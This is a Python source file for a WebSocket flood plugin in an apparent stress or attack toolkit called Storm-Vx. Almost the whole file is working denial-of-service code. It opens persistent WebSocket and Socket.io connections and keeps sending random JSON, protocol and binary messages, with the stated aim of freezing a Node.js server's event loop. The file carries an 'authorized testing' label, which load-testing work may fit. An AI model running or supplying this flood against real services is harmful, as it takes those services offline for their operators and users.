#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_ws_flood — WebSocket Flood Attack Plugin

Opens persistent WebSocket connections and sends continuous messages.
Node.js is single-threaded, so when the event loop fills up, the
entire server freezes. Also supports Socket.io transport.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import json
import random
import os
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str, rand_user
from config.defaults import WS_HEARTBEAT, WS_CONNECT_TIMEOUT, WS_RECEIVE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)

import aiohttp


__all__ = ["WsFloodPlugin"]


class WsFloodPlugin(AttackPlugin):
    """WebSocket Flood — persistent connections with continuous messages.

    Opens WebSocket connections (both plain WS and Socket.io) and
    floods them with messages. Because Node.js is single-threaded,
    filling the event loop with WS events freezes the entire server.
    Each worker maintains ONE persistent connection and sends many
    messages through it, reconnecting on drop.
    """

    meta = PluginMeta(
        name='ws_flood',
        version='1.0.0',
        plugin_type='attack',
        description='WebSocket flood — persistent connections with continuous messages to freeze Node.js event loop (50x)',
        tags=['websocket', 'nodejs', 'persistent', 'event-loop', 'flood'],
        priority=26,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """WebSocket flood worker: open persistent WS and send messages continuously."""
        _ssl = context.ssl_param

        ws_url = context.url.replace('https://', 'wss://').replace('http://', 'ws://')
        socketio_url = ws_url.rstrip('/') + '/socket.io/?EIO=4&transport=websocket'
        delay_ms = context.extra.delay_ms

        # URL variants to try: Socket.io first, then plain WS
        url_variants = [socketio_url, ws_url]

        while not self._stop_event.is_set():
            for url in url_variants:
                if self._stop_event.is_set():
                    return
                try:
                    async with context.session.ws_connect(
                        url,
                        ssl=_ssl,
                        heartbeat=WS_HEARTBEAT,       # W2.4: Send keep-alive pings
                        max_msg_size=0,     # Accept any message size
                        timeout=WS_CONNECT_TIMEOUT,        # W2.4: Connection timeout
                    ) as ws:
                        await self._record("WS-FLOOD", True, 101, 0, hint="connected", url=url[:60])

                        # Inner loop: send messages continuously
                        msg_count = 0
                        while not self._stop_event.is_set():
                            try:
                                # Rotate through message types
                                msg_type = msg_count % 4
                                if msg_type == 0:
                                    # Random JSON payload
                                    payload = json.dumps({
                                        "type": "message",
                                        "data": rand_str(40),
                                        "room": rand_str(6),
                                        "user": rand_user(),
                                        "timestamp": int(time.time() * 1000),
                                    })
                                    await ws.send_str(payload)
                                elif msg_type == 1:
                                    # Socket.io protocol message
                                    payload = '42["message",{"data":"' + rand_str(30) + '","user":"' + rand_user() + '"}]'
                                    await ws.send_str(payload)
                                elif msg_type == 2:
                                    # Binary frame with random data
                                    payload = os.urandom(random.randint(64, 512))
                                    await ws.send_bytes(payload)
                                else:
                                    # Ping frame to keep connection alive
                                    await ws.ping()
                                    msg_count += 1
                                    await self._record("WS-FLOOD", True, 0, 0, hint="ping", url=url[:60])
                                    # Brief pause then continue
                                    if delay_ms > 0:
                                        await asyncio.sleep(delay_ms / 1000.0)
                                    continue

                                msg_count += 1
                                await self._record("WS-FLOOD", True, 0, 0, hint="msg_sent", url=url[:60])

                                # Occasionally drain incoming messages to prevent buffer buildup
                                try:
                                    msg = await asyncio.wait_for(ws.receive(), timeout=WS_RECEIVE_TIMEOUT)  # W2.4
                                    if msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSED):
                                        # Connection lost, break inner loop to reconnect
                                        await self._record("WS-FLOOD", False, 0, 0, hint="ws_closed", url=url[:60])
                                        break
                                except asyncio.TimeoutError:
                                    pass  # No message waiting, that's fine

                                if delay_ms > 0:
                                    await asyncio.sleep(delay_ms / 1000.0)

                            except asyncio.CancelledError:
                                return
                            except (aiohttp.ClientError, RuntimeError, OSError, ConnectionError) as inner_exc:
                                # Message send failed — connection probably dead
                                await self._record("WS-FLOOD", False, 0, 0,
                                                   err=type(inner_exc).__name__, url=url[:60])
                                break  # Break inner loop, will reconnect

                        # Try to close gracefully
                        try:
                            await ws.close()
                        except (aiohttp.ClientError, RuntimeError, OSError):
                            pass

                        # Connection ended normally; break to outer loop for reconnect
                        break

                except asyncio.CancelledError:
                    return
                except (aiohttp.ClientError, RuntimeError, OSError, ConnectionError) as exc:
                    await self._record("WS-FLOOD", False, 0, 0,
                                       err=type(exc).__name__, url=url[:60])
                    # Try next URL variant on failure
                    continue

            # Brief pause before reconnect cycle
            if not self._stop_event.is_set():
                await asyncio.sleep(1)

